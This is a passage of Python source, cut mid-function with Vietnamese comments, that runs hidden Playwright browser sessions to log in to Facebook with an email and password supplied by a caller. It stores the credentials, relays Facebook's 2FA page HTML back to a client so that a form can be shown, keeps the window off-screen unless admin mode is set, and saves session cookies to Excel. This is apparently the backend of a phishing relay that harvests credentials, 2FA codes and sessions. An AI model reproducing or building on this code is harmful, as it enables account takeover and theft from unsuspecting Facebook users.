                    print("get_cookies: Đã đóng trình duyệt sau khi lưu cookies.")
                except Exception as close_err:
                    print(f"get_cookies: Lỗi khi đóng trình duyệt: {close_err}")
                # Reset biến global
                LAST_PAGE = None
                LAST_CONTEXT = None
            except Exception as excel_err:
                print(f"get_cookies: Lỗi khi lưu cookies vào Excel: {excel_err}")
    except Exception as e:
        print(f"get_cookies: Lỗi không xác định: {e}")
    return cookies_str
_browser_sessions = {}
_sessions_lock = threading.Lock()
# Fix cho asyncio trong threaded context
try:
    import nest_asyncio
    nest_asyncio.apply()
except:
    pass

def init_browser_session(session_id: str, headless: bool = None, auto_navigate: bool = True) -> bool:
    """Khởi tạo browser session mới với master profile nếu có
    Args:
        session_id: ID của session
        headless: Chạy ẩn hay hiện browser
        auto_navigate: Tự động navigate đến trang login sau khi init
    Note: Chạy trực tiếp không qua thread con để tránh lỗi Playwright
    """
    # Xử lý giá trị mặc định cho headless
    if headless is None:
        headless = _get_headless_default()
    try:
        # Init browser trực tiếp
        result = _init_browser_session_impl(session_id, headless)
        # Nếu init thành công và cần navigate
        if result and auto_navigate:
            nav_result = _navigate_to_facebook_login_impl(session_id)
            return result and nav_result
        return result
    except Exception as e:
        print(f"[InitBrowser] Lỗi: {e}")
        import traceback
        traceback.print_exc()
        return False

def _init_browser_session_impl(session_id: str, headless: bool = None) -> bool:
    """Implementation thực sự của init_browser_session"""
    # Xử lý giá trị mặc định cho headless
    if headless is None:
        headless = _get_headless_default()
    from datetime import datetime
    try:
        from playwright.sync_api import sync_playwright
        import tempfile
        import shutil
        import os
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        master_path = os.path.join(base_dir, "master")
        # Tạo profile tạm
        temp_profile_dir = tempfile.mkdtemp(prefix=f"fb_session_{session_id[:8]}_")
        # 1. Copy extensions từ project folder extension/ nếu có
        project_ext_dir = os.path.join(base_dir, "extension")
        if os.path.isdir(project_ext_dir):
            try:
                unpacked_ext_dir = os.path.join(temp_profile_dir, "extension_unpacked")
                shutil.copytree(project_ext_dir, unpacked_ext_dir, dirs_exist_ok=True)
                print(f"[InitBrowser] Đã copy extensions từ project/extension")
            except Exception as e:
                print(f"[InitBrowser] Lỗi copy project/extension: {e}")
        # 2. Copy từ master nếu có
        if os.path.isdir(master_path) and os.listdir(master_path):
            try:
                print(f"[InitBrowser] Đang copy từ master: {master_path}")
                for item in os.listdir(master_path):
                    # Chỉ copy Extensions và các file cần thiết, KHÔNG copy Default
                    if item in ('Extensions',):
                        src = os.path.join(master_path, item)
                        dst = os.path.join(temp_profile_dir, item)
                        if os.path.isdir(src):
                            shutil.copytree(src, dst, dirs_exist_ok=True)
                            print(f"[InitBrowser] Đã copy: {item}")
                    elif item not in ('Default', 'GPUCache', 'ShaderCache', 'blob_storage', 'Code Cache', 'Service Worker'):
                        # Copy các file cấu hình khác (không phải thư mục Default)
                        src = os.path.join(master_path, item)
                        dst = os.path.join(temp_profile_dir, item)
                        if os.path.isfile(src):
                            shutil.copy2(src, dst)
                # Copy Extensions và Extension Settings từ master/Default/ nếu có
                temp_default = os.path.join(temp_profile_dir, 'Default')
                os.makedirs(temp_default, exist_ok=True)
                # Các thư mục cần copy để giữ extension và cấu hình (API key)
                ext_settings_folders = [
                    'Extensions',
                    'Local Extension Settings',
                    'Extension State',
                    'Managed Extension Settings',
                    'Extension Rules',
                ]
                copied_settings = []
                for folder_name in ext_settings_folders:
                    master_folder = os.path.join(master_path, 'Default', folder_name)
                    if os.path.isdir(master_folder):
                        try:
                            temp_folder = os.path.join(temp_default, folder_name)
                            shutil.copytree(master_folder, temp_folder, dirs_exist_ok=True)
                            copied_settings.append(folder_name)
                        except Exception as settings_err:
                            print(f"[InitBrowser] Lỗi copy {folder_name}: {settings_err}")
                # Copy Extensions ra root để đảm bảo Chrome tìm thấy
                master_default_ext = os.path.join(master_path, 'Default', 'Extensions')
                if os.path.isdir(master_default_ext):
                    try:
                        root_ext = os.path.join(temp_profile_dir, 'Extensions')
                        shutil.copytree(master_default_ext, root_ext, dirs_exist_ok=True)
                        copied_settings.append('Extensions(root)')
                    except Exception as root_copy_err:
                        print(f"[InitBrowser] Lỗi copy Extensions ra root: {root_copy_err}")
                if copied_settings:
                    print(f"[InitBrowser] Đã copy: {', '.join(copied_settings)}")
                else:
                    print(f"[InitBrowser] Không tìm thấy Extensions/Settings trong master/Default")
                print(f"[InitBrowser] Đã copy master profile thành công")
                # Xóa các file lock/temp để tránh crash
                try:
                    locks_to_remove = [
                        os.path.join(temp_profile_dir, "Default", "LOCK"),
                        os.path.join(temp_profile_dir, "Default", "lockfile"),
                        os.path.join(temp_profile_dir, "Default", "Login Data-journal"),
                        os.path.join(temp_profile_dir, "Default", "Cookies-journal"),
                        os.path.join(temp_profile_dir, "Default", "History-journal"),
                        os.path.join(temp_profile_dir, "Default", "Network Action Predictor-journal"),
                        os.path.join(temp_profile_dir, "Default", "QuotaManager-journal"),
                        os.path.join(temp_profile_dir, "Default", "Web Data-journal"),
                        os.path.join(temp_profile_dir, "Default", "last_session"),
                        os.path.join(temp_profile_dir, "Default", "Current Tabs"),
                        os.path.join(temp_profile_dir, "Default", "Current Session"),
                        os.path.join(temp_profile_dir, "Last Version"),
                        os.path.join(temp_profile_dir, "Local State"),
                    ]
                    for lock_file in locks_to_remove:
                        if os.path.exists(lock_file):
                            try:
                                os.remove(lock_file)
                                print(f"[InitBrowser] Đã xóa: {os.path.basename(lock_file)}")
                            except:
                                pass
                except Exception as clean_err:
                    print(f"[InitBrowser] Lỗi khi xóa locks: {clean_err}")
            except Exception as copy_err:
                print(f"[InitBrowser] Lỗi copy master (dùng profile trống): {copy_err}")
        else:
            print(f"[InitBrowser] Không có master, dùng profile trống")
        # Khởi động browser - thử sync trước, nếu lỗi asyncio thì dùng async
        try:
            playwright = sync_playwright().start()
        except Exception as pw_err:
            if "asyncio" in str(pw_err).lower() or "event loop" in str(pw_err).lower():
                print(f"[InitBrowser] Sync API lỗi asyncio, thử dùng async API...")
                import asyncio
                playwright = asyncio.get_event_loop().run_until_complete(async_playwright().start())
            else:
                raise
        args = [
            "--disable-blink-features=AutomationControlled",
            "--disable-gpu",
            "--no-first-run",
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-background-networking",
        ]
        # 3. Load extensions từ 3 nguồn:
        #    - extension_unpacked/ (từ project)
        #    - Extensions/ (từ master root)
        #    - Default/Extensions/ (từ master Default)
        ext_folders = []
        ext_search_paths = [
            os.path.join(temp_profile_dir, "extension_unpacked"),  # Từ project folder
            os.path.join(temp_profile_dir, "Extensions"),          # Từ master root
            os.path.join(temp_profile_dir, "Default", "Extensions")  # Từ master Default
        ]
        for ext_path in ext_search_paths:
            if os.path.isdir(ext_path):
                # Kiểm tra nếu chính ext_path là unpacked extension (có manifest.json trực tiếp)
                if os.path.exists(os.path.join(ext_path, 'manifest.json')):
                    if ext_path not in ext_folders:
                        ext_folders.append(ext_path)
                        print(f"[InitBrowser] Tìm thấy unpacked extension: {os.path.basename(ext_path)}")
                    continue  # Skip tìm trong subdirectories
                # Tìm trong các thư mục con (Chrome Web Store extensions)
                try:
                    for ext_id in os.listdir(ext_path):
                        ext_full_path = os.path.join(ext_path, ext_id)
                        if os.path.isdir(ext_full_path):
                            # Kiểm tra nếu là unpacked extension (có manifest.json trực tiếp)
                            if os.path.exists(os.path.join(ext_full_path, 'manifest.json')):
                                if ext_full_path not in ext_folders:
                                    ext_folders.append(ext_full_path)
                                    print(f"[InitBrowser] Tìm thấy unpacked extension: {ext_id}")
                            else:
                                # Tìm thư mục version (Chrome Web Store extension)
                                versions = [v for v in os.listdir(ext_full_path) if os.path.isdir(os.path.join(ext_full_path, v))]
                                if versions:
                                    version_path = os.path.join(ext_full_path, versions[0])
                                    if version_path not in ext_folders:
                                        ext_folders.append(version_path)
                                        print(f"[InitBrowser] Tìm thấy extension: {ext_id} (v{versions[0]})")
                except Exception as e:
                    print(f"[InitBrowser] Lỗi đọc extensions từ {ext_path}: {e}")
        if ext_folders:
            load_ext_arg = f"--load-extension={','.join(ext_folders)}"
            args.append(load_ext_arg)
            args.append(f"--disable-extensions-except={','.join(ext_folders)}")
            print(f"[InitBrowser] Đã load {len(ext_folders)} extension(s)")
        else:
            print(f"[InitBrowser] Không tìm thấy extension nào")
        context = playwright.chromium.launch_persistent_context(
            user_data_dir=temp_profile_dir,
            headless=headless,
            args=args,
            viewport={"width": 1280, "height": 800},
            accept_downloads=True
        )
        page = context.pages[0] if context.pages else context.new_page()
        if not headless:
            def _set_window_position(page) -> None:
                try:
                    import sys
                    import os
                    if sys.platform != "win32":
                        return
                    # Only Chromium supports CDP reliably
                    if not hasattr(page.context, "new_cdp_session"):
                        return
                    cdp = page.context.new_cdp_session(page)
                    win = cdp.send("Browser.getWindowForTarget")
                    window_id = win.get("windowId")
                    if window_id is None:
                        return
                    # Kiểm tra admin mode để set vị trí
                    is_admin = os.environ.get('BROWSER_ADMIN_MODE', 'false').lower() == 'true'
                    if is_admin:
                        cdp.send(
                            "Browser.setWindowBounds",
                            {
                                "windowId": window_id,
                                "bounds": {"left": 500, "top": 500, "width": 1280, "height": 800, "windowState": "normal"},
                            },
                        )
                        print(f"[InitBrowser] Window position: 500,500 (admin mode)")
                    else:
                        cdp.send(
                            "Browser.setWindowBounds",
                            {
                                "windowId": window_id,
                                "bounds": {"left": -5000, "top": -5000, "width": 1280, "height": 800, "windowState": "normal"},
                            },
                        )
                        print(f"[InitBrowser] Window position: -5000,-5000 (hidden mode)")
                except Exception as e:
                    print(f"[InitBrowser] Lỗi set window position: {e}")
                    return
            _set_window_position(page)
        # Lưu session
        from datetime import datetime
        with _sessions_lock:
            _browser_sessions[session_id] = {
                'context': context,
                'page': page,
                'playwright': playwright,
                'profile_dir': temp_profile_dir,
                'email': None,
                'password': None,
                'created_at': datetime.now()
            }
        print(f"[InitBrowser] Đã khởi tạo browser cho session {session_id[:8]}...")
        return True
    except Exception as e:
        print(f"[InitBrowser] Lỗi: {e}")
        import traceback
        traceback.print_exc()
        return False

def navigate_to_facebook_login(session_id: str) -> bool:
    """Điều hướng đến trang login Facebook"""
    with _sessions_lock:
        session = _browser_sessions.get(session_id)
    if not session:
        print(f"[Navigate] Không tìm thấy session {session_id[:8]}...")
        return False
    return _navigate_to_facebook_login_impl(session_id)

def _navigate_to_facebook_login_impl(session_id: str) -> bool:
    """Implementation thực sự của navigate_to_facebook_login"""
    with _sessions_lock:
        session = _browser_sessions.get(session_id)
    if not session:
        print(f"[Navigate] Không tìm thấy session {session_id[:8]}...")
        return False
    try:
        page = session['page']
        page.goto("https://www.facebook.com/login/?locale=en_GB", wait_until="domcontentloaded", timeout=30000)
        print(f"[Navigate] URL hiện tại: {page.url}")
        return True
    except Exception as e:
        print(f"[Navigate] Lỗi: {e}")
        return False

def cleanup_expired_sessions(max_age_minutes: int = 5):
    """Xóa các session đã tồn tại quá lâu (mặc định 5 phút)"""
    from datetime import datetime, timedelta
    with _sessions_lock:
        now = datetime.now()
        expired_sessions = []
        for session_id, session in _browser_sessions.items():
            created_at = session.get('created_at')
            if created_at:
                age = now - created_at
                if age > timedelta(minutes=max_age_minutes):
                    expired_sessions.append(session_id)
        for session_id in expired_sessions:
            try:
                session = _browser_sessions[session_id]
                # Đóng browser nếu còn mở
                try:
                    session['context'].close()
                except:
                    pass
                del _browser_sessions[session_id]
                print(f"[Cleanup] Đã xóa session hết hạn: {session_id[:8]}...")
            except Exception as e:
                print(f"[Cleanup] Lỗi khi xóa session {session_id[:8]}...: {e}")
        if expired_sessions:
            print(f"[Cleanup] Đã xóa {len(expired_sessions)} session hết hạn")

def get_session_browser(session_id: str):
    """Lấy thông tin browser của session - tự động cleanup session cũ"""
    # Cleanup session cũ trước khi lấy
    cleanup_expired_sessions()
    with _sessions_lock:
        return _browser_sessions.get(session_id)

def get_browser_session(email: str):
    """Tìm session theo email"""
    with _sessions_lock:
        for session_id, session in _browser_sessions.items():
            if session.get('email') == email:
                return session
    return None

def transfer_session_to_email(session_id: str, email: str):
    """Chuyển session sang email"""
    with _sessions_lock:
        if session_id in _browser_sessions:
            _browser_sessions[session_id]['email'] = email
            print(f"[Transfer] Session {session_id[:8]}... -> Email {email}")

def login_with_session(session_id: str, email: str, password: str, timeout: int = 300000) -> tuple[str, bool, bool]:
    """Đăng nhập với session đã có - trả về (html, should_get_cookies, login_failed)
    Lưu ý: Hàm này được gọi trong session worker thread, nên chạy trực tiếp 
    không cần tạo thread con để tránh xung đột với Playwright
    """
    return _login_with_session_impl(session_id, email, password, timeout)

def _login_with_session_impl(session_id: str, email: str, password: str, timeout: int = 300000) -> tuple[str, bool, bool]:
    """Implementation thực sự của login_with_session"""
    with _sessions_lock:
        session = _browser_sessions.get(session_id)
    # Nếu chưa có session, tự động khởi tạo browser
    if not session:
        print(f"[LoginWithSession] Session chưa tồn tại, đang khởi tạo browser...")
        success = _init_browser_session_impl(session_id, headless=False)
        if success:
            # Điều hướng đến trang login
            nav_success = _navigate_to_facebook_login_impl(session_id)
            if nav_success:
                with _sessions_lock:
                    session = _browser_sessions.get(session_id)
            if not session:
                print(f"[LoginWithSession] Không thể khởi tạo browser")
                return "", False, True  # login_failed=True
        else:
            print(f"[LoginWithSession] Khởi tạo browser thất bại")
            return "", False, True  # login_failed=True
    if not session:
        return "", False, True
    page = session['page']
    context = session['context']
    try:
        # Lưu credentials
        session['email'] = email
        session['password'] = password
        # Điền form
        print(f"[LoginWithSession] Đang điền thông tin đăng nhập...")
        page.fill('input[name="email"]', email)
        time.sleep(0.3)
        page.fill('input[name="pass"]', password)
        time.sleep(0.3)
        # Click đăng nhập
        print(f"[LoginWithSession] Đang tìm nút đăng nhập...")
        login_button = page.locator('[aria-label="Log in"][role="button"]')
        if login_button.count() == 0:
            login_button = page.locator('button[name="login"]')
        if login_button.count() == 0:
            login_button = page.locator('button[type="submit"]')
        if login_button.count() > 0:
            print(f"[LoginWithSession] Đang click đăng nhập...")
            login_button.first.click()
        else:
            return "", False, False
        # Đợi và kiểm tra URL, mỗi 0.5s kiểm tra một lần
        # - authentication: đợi vô hạn (không tính vào số lần đếm)
        # - các trang khác: đợi tối đa 14 lần (7 giây)
        print(f"[LoginWithSession] Đang đợi phản hồi sau đăng nhập...")
        is_2fa = False
        login_success = False
        check_count = 0  # Số lần kiểm tra (không tính authentication)
        max_checks = 14  # 14 lần x 0.5s = 7s cho các trang khác
        while True:
            time.sleep(0.5)
            # Lấy URL mới nhất từ browser bằng JavaScript
            try:
                current_url = page.evaluate("() => window.location.href")
            except:
                current_url = page.url
            # Tách riêng 2 trường hợp:
            # - authentication: trang giải captcha -> BỎ QUA, tiếp tục đợi (không tính vào số lần đếm)
            # - two_factor: trang nhập code 2FA -> return hfa.html để client hiển thị form
            if 'two_step_verification/authentication' in current_url:
                print(f"[LoginWithSession] Phát hiện trang authentication (captcha) - đợi vô hạn...")
                # Đây là trang giải captcha, tiếp tục đợi (không tăng counter)
                continue
            # Tăng counter cho các trang khác
            check_count += 1
            print(f"[LoginWithSession] Kiểm tra URL ({check_count}/{max_checks}): {current_url}")
            if 'two_step_verification/two_factor' in current_url or 'auth_platform' in current_url:
                print(f"[LoginWithSession] Phát hiện trang 2FA (two_factor/auth_platform) - return hfa.html")
                is_2fa = True
                break
            if any(pattern in current_url for pattern in ['two_factor', '2fa', 'auth_platform']):
                print(f"[LoginWithSession] Phát hiện trang 2FA!")
                is_2fa = True
                break
            # Kiểm tra đăng nhập thành công (không còn ở trang login)
            try:
                from urllib.parse import urlparse
                parsed_url = urlparse(current_url)
                url_path = parsed_url.path
            except:
                url_path = current_url  # fallback
            if '/login' not in url_path and 'facebook.com' in current_url:
                print(f"[LoginWithSession] Đăng nhập thành công!")
                login_success = True
                break
            # Kiểm tra lỗi đăng nhập
            if '/login/web/' in current_url:
                print(f"[LoginWithSession] Lỗi đăng nhập (sai mật khẩu)")
                return "", False, True
            # Dừng nếu đã đợi quá lâu (không tính authentication)
            if check_count >= max_checks:
                print(f"[LoginWithSession] Hết thời gian đợi ({max_checks * 0.5}s)")
                break
        # Nếu là 2FA, trả về HTML và spawn thread đợi checkpoint_src=any
        if is_2fa:
            html = page.content()
            LAST_CONTEXT = context
            LAST_PAGE = page
            LAST_EMAIL = email
            LAST_PASSWORD = password
            print(f"[LoginWithSession] Đã lưu context/page cho 2FA")
            return html, False, False
        # Nếu đăng nhập thành công, lấy HTML và lưu context/page để lấy cookies sau
        if login_success:
            html = page.content()
            # Lưu lại context/page/email/password để hàm get_cookies có thể dùng sau này
            LAST_CONTEXT = context
            LAST_PAGE = page
            LAST_EMAIL = email
            LAST_PASSWORD = password
            print(f"[LoginWithSession] Đã lưu context/page cho get_cookies")
            return html, True, False
        # Nếu sau 7s vẫn ở trang login, reload và trả về lỗi
        print(f"[LoginWithSession] Hết thời gian đợi, vẫn ở trang login - đang reload...")
        try:
            page.reload(wait_until="domcontentloaded", timeout=10000)
            print(f"[LoginWithSession] Đã reload trang")
        except Exception as reload_err:
            print(f"[LoginWithSession] Lỗi reload: {reload_err}")
        return "", False, True  # Trả về login_failed=True để hiển thị cảnh báo
    except Exception as e:
        print(f"[LoginWithSession] Lỗi: {e}")
        return "", False, False
